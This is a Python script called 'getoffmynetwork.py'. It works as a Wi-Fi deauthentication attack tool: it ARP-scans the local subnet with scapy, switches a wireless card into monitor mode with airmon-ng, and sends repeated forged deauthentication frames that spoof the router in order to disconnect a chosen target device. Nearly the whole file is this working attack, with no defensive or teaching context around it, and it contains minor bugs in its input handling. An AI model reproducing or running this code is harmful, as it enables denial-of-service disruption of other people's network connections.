#!/usr/bin/env python
# getoffmynetwork.py 
# author = Jesse
# date = 9/28/2018


# try to import the needed modules
try:
	from scapy.all import *
	from termcolor import colored
	import subprocess
	import os
	import sys
	import urllib2

# handling ImportError
except ImportError:
	# cannot print colored text because user might not have module for this installed		
	print('requirements arent properly statisfied!')
	sys.exit()

except KeyboardInterrupt:
	# cannot print colored text because user might not have the module for this installed
	print('requested shutdown...')
	sys.exit()




# defining variables 


# for cleaner errors
sys.tracebacklimit=0

# defining a variable that contains 'ip route' to retrieve your default gateway
router_ip = subprocess.check_output('ip route', shell=True)

# defining a variable that contains the command 'ifconfig | grep inet'
local_ip = subprocess.check_output('ifconfig | grep inet', shell=True)





# functions starting here


# function that checks if the user has an internet connection
def check_connection():
	try:
		# open google.com
	        response=urllib2.urlopen('https://www.google.com/')
	# if an error occurs, quit
	except urllib2.URLError as err:
		# still display the logo even if the user doesnt have a internet connection
		# clearing the screen
		subprocess.call('clear',shell=True)

		# printing the logo with figlet
		print('==============================================================================================================')
		figlet = subprocess.check_output('figlet -c -f big getofmynetwork -w 100', shell=True)
		print(colored(figlet, 'red'))
		print('==============================================================================================================')
			
		# lettting user know
		print(colored('\n[!]', 'red')),
	    	print('you have to be connected to a network to use getofmynetwork.py!')
		
		# time.sleep for the looks
		time.sleep(0.7)

		print(colored('\n[*]', 'red')),
		print('exiting...')

		# time.sleep for the looks
		time.sleep(1)
	
		# exiting
		sys.exit()

check_connection()


# check if user is root
def checkRoot():
	# userid of root is always 0
	if os.geteuid() != 0:
		print('getofmynetwork.py needs root priveleges to run, please try again with sudo')
		sys.exit()
	
checkRoot()



def getofmynetwork():
		try:
			# clearing the screen
			subprocess.call('clear',shell=True)

			# printing the logo with figlet
			print('==============================================================================================================')
			figlet = subprocess.check_output('figlet -c -f big getofmynetwork -w 100', shell=True)
			print(colored(figlet, 'red'))
			print('==============================================================================================================')
			
			print(colored('\n[*]', 'red')),
			# ask for local subnet
			askSubnet = raw_input('enter your local subnet for the ARP ping(e.g. 192.168.0.0/16): ')
			# a subnet always contains a /
			if not '/' in askSubnet:
				print(colored('[!]', 'red')),
				askSubnet2 = raw_input('thats not a valid subnet, r to enter again, [enter] if you just want to ping a single host): ')
				if askSubnet2 == 'r':
					print(colored('[*]', 'red')),
					# overwrite the variable
					askSubnet = raw_input('enter your local subnet for the ARP ping(i.e. 192.168.0.0/16): ')

				elif askSubnet2 == 'R':
					print(colored('[*]', 'red')),
					# overwrite the variable
					askSubnet = raw_input('enter your local subnet for the ARP ping(i.e. 192.168.0.0/16): ')

	
					
			# minimum length of a subnet is something like 11 ^^
			if len(askSubnet) < 11:
				# the comma is used to print both print statements on the same line
				print(colored('[!]', 'red')),
				# you might have entered that wrong ;)
				askSubnet2 = raw_input('are you sure you entered that right?(r to enter again): ')

				time.sleep(1)

				if askSubnet2 == 'r':
					print(colored('[*]', 'red')),
					# overwrite the variable
					askSubnet = raw_input('enter your local subnet for the ARP ping(i.e. 192.168.0.0/16): ')
			
				elif askSubnet2 == 'R':
					print(colored('[*]', 'red')),
					# overwrite the variable
					askSubnet = raw_input('enter your local subnet for the ARP ping(i.e. 192.168.0.0/16): ')
			
			time.sleep(1)
			

			print(colored('\n[*]', 'red')),
			# letting the user know the arp ping is running
			print('ARP ping is running...\n')
		
			
			# performing the arp ping on the whole subnet with scapy			
			arp_ping = ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=askSubnet),timeout=2)
			# displaying the arp ping output on the screen(IP and MACaddr)
			arp_ping_output = ans.summary(lambda (s,r): r.sprintf('%ARP.psrc% has %Ether.src%') )
		
			# not all at once!
			time.sleep(1)
			
			print(colored('[!]', 'red')),		
			# prints the users default gateway	
			print('your default gateway is at ' + router_ip[12:26])

			print(colored('[!]', 'red')),
			# prints users local ip
			print('you are at' + local_ip[12:26])

			time.sleep(1)
			
			print(colored('\n[*]', 'red')),
			# ask interface
			interface = raw_input('enter interface: ')

			# if 'eth' is in the input from user
			if 'eth' in interface:
				print(colored('[-]', 'red')),
				print('wired network interfaces cannot be put in monitor mode, you need a wireless interface')
				print(colored('[-]', 'red')),
				print('exiting...')
				# exiting
				sys.exit()

			# sleep for 1 second for the looks
			time.sleep(1)

	
		

			
			# < 3 character interface name?
			if len(interface) < 3:
				# we all misspell sometimes :)
				print(colored('\n[!]', 'red')),
				interface2 = raw_input('are you sure you entered that right?(r to enter again): ')
				
				time.sleep(1)
				
				if interface2 == 'r':
					print(colored('[*]', 'red')),
					interface = raw_input('enter interface: ')
				
				elif interface2 == 'R':
					print(colored('[*]', 'red')),
					interface = raw_input('enter interface: ')
			
			time.sleep(1)
			
			# make sure the user enters the non-monitor mode interface name to prevent later errors
			if interface[-3:] == 'mon':
				print(colored('[!]', 'red')),
				interface2 = raw_input('you have to enter non-monitor mode interface name(r to enter again): ')
				if interface2 == 'r':
					print(colored('[*]', 'red')),
					interface = raw_input('enter interface: ')
				elif interface2 == 'R':
					print(colored('[*]', 'red')),
					interface = raw_input('enter interface: ')


				
			print(colored('[*]', 'red')),	
			# asking routers mac	
			router_mac = raw_input('enter default gateway mac: ')
			if not ':' in router_mac:
				print(colored('[!]', 'red')),
				router_mac2 = raw_input('please enter a valid mac address(r to enter again): ')
				if router_mac2 == 'r':
					print(colored('[*]', 'red')),
					router_mac = raw_input('enter default gateway mac: ')
	
				elif router_mac2 == 'R':
					print(colored('[*]', 'red')),
					router_mac = raw_input('enter default gateway mac: ')

			
			# mac addresses are always 17 characters long
			if len(router_mac) != 17:
				print(colored('\n[!]', 'red')),
				router_mac2 = raw_input('are you sure you entered that right?(r to enter again) ')

				time.sleep(1)
				
				if router_mac2 == 'r':
					print(colored('[*]', 'red')),
					router_mac = raw_input('enter default gateway mac: ')

				elif router_mac2 == 'R':
					print(colored('[*]', 'red')),
					router_mac = raw_input('enter default gateway mac: ')
			
			time.sleep(1)



			print(colored('[*]', 'red')),			
			target_mac = raw_input('enter targets mac: ')
			
			# mac addresses are always 17 characters long
			if len(target_mac) != 17:
				print(colored('\n[!]', 'red')),
				target_mac2 = raw_input('are you sure you entered that right?(r to enter again) ')
			
				time.sleep(1)

				if target_mac2 == 'r':
					print(colored('[*]', 'red')),
					target_mac = raw_input('enter targets mac: ')
				elif target_mac2 == 'R':
					print(colored('[*]', 'red')),
					target_mac = raw_input('enter targets mac: ')

			time.sleep(1)


			# if target mac does not contain at least one ':' 
			if not ':' in target_mac:
				print(colored('[!]', 'red')),
				target_mac2 = raw_input('please enter a valid mac address(r to enter again): ')
				if target_mac2 == 'r':
					print(colored('[*]', 'red')),
					# let the user asign the target_mac variable again
					target_mac = raw_input('enter targets mac: ')
	
				elif router_mac2 == 'R':
					print(colored('[*]', 'red')),
					# let the user asign the target_mac variable again
					router_mac = raw_input('enter default gateway mac: ')

			time.sleep(1)


			# starting monitor mode

			print(colored('\n[*]', 'red')),
			# letting the user know what is going on
			print('setting monitor mode up on ' + interface)
			
			# putting interface into monitor mode
			start_mon_mode = subprocess.check_output('airmon-ng start ' + interface, shell=True)
			# output should be longer than 30 characters
			if len(start_mon_mode) < 30:
				print(colored('[!]', 'red'))
				print('an error occured when setting monitor mode up on ' + interface)
				sys.exit()
				
			# hide the start_mon_mode output to keep the shell clean
			print(start_mon_mode[0:0])
			print(colored('[+]', 'red')),
			print('monitor mode on ' + interface + ' has been set up!')
				
			time.sleep(1.5)
			
			# interface name when in monitor mode
			monInterface = interface+'mon'

			
			#  deauthentication part
			
			# asking amount of deauth packets
			print(colored('[*]', 'red')),
			amount = raw_input('enter the amount of deauthentication packets you want to send(100-150 is recommended): ')
			# send some more!
			if len(amount) < 2:
				print(colored('[!]', 'red')),
				amount2 = raw_input('you have to send at least 10 deauthentication packets(r to enter again): ')
				if amount2 == 'r':
					print(colored('[*]', 'red')),
					amount = raw_input('enter the amount of deauthentication packets you want to send(100-150 is recommended): ')
				elif amount2 == 'R':
					print(colored('[*]', 'red')),
					amount = raw_input('enter the amount of deauthentication packets you want to send(100-150 is recommended): ')
				 		
			
			# defining some more variables that are needed to excecute the deauthentication attack
			conf.iface = interface+'mon'
			conf.verb = 0
	
			# the deauthentication crafted with scapy
			packet = RadioTap()/Dot11(type=0,subtype=12,addr1=target_mac,addr2=router_mac,addr3=router_mac)/Dot11Deauth(reason=7)
			# for loop for sending deauth packets
			for n in range(int(amount)):
				
				# used in the for loop for sending the deauthentication packets
				packet_num = 0
				# sending the packet
				sendp(packet)
				print(colored('[+]', 'red')),
				print('packets are being sent to ' + target_mac)

			# done!
			print(colored('[+]', 'red')),
			print('done sending packets!')

			time.sleep(1)

			# checks if interface is in monitor mode
			# check if the script went until the assignment of the monInterface variable,
			# if it did, your interface should be set into monitor mode
			if monInterface[-3:] == 'mon':
				print(colored('[*]', 'red')),
				print('stopping monitor mode on ' + monInterface + '\n')
				# stopping monitor mode on interface
				stop_mon_mode = subprocess.check_output('airmon-ng stop ' + monInterface, shell=True)
	
				# hide the stop_mon_mode output to keep the shell clean			
				print(stop_mon_mode[0:0])
				
				time.sleep(1)
				
				print(colored('[+]', 'red')),
				print('done')
			
		
		# handling Ctrl + C
		except KeyboardInterrupt:
			# requested shutdown :(
			print(colored('\n\n[-]', 'red')),
			print('requested shutdown\n')

			time.sleep(1)

			# checks if interface is in monitor mode
			# checks if the script went until the assignment of the mon variable,
			# if it did, your interface should be set into monitor mode
			if monInterface[-3:] == 'mon':
				print(colored('[*]', 'red')),
				print('stopping monitor mode on ' + monInterface + '\n')
				# stopping monitor mode on interface
				stop_mon_mode = subprocess.check_output('airmon-ng stop ' + monInterface, shell=True)
	
				# hide the stop_mon_mode output to keep the shell clean			
				print(stop_mon_mode[0:0])
		

				time.sleep(0.5)
			
				print(colored('[*]', 'red')),
				print('done!')



getofmynetwork()

# if anything goes wrong and python exits the function monitor mode will still be stopped
# if monitor mode has already been stopped this wont harm your network interface

# stopping monitor mode on interface
stop_mon_mode = subprocess.check_output('airmon-ng stop ' + monInterface, shell=True)
	
# hide the stop_mon_mode output to keep the shell clean			
print(stop_mon_mode[0:0])
